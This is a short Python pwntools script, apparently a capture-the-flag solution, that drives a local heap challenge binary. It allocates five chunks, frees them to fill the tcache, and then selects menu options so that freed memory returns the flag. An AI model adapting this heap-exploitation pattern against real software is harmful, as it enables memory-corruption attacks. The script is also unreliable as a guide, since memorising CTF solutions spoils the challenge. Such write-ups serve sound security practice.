#!usr/bin/python3
from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '', 1337

def create(idx):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', b'112')
    io.sendlineafter(b':', b'something')

def delete(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    
def exploit():
    global io
    io = process([exe])
    
    for i in range(1, 6):
        create(i)
    
    # filling tcache    
    for i in range(1, 6):
        delete(i)
        
    # loading flag
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', b'1')

    io.interactive()
    
if __name__ == '__main__':
    exploit()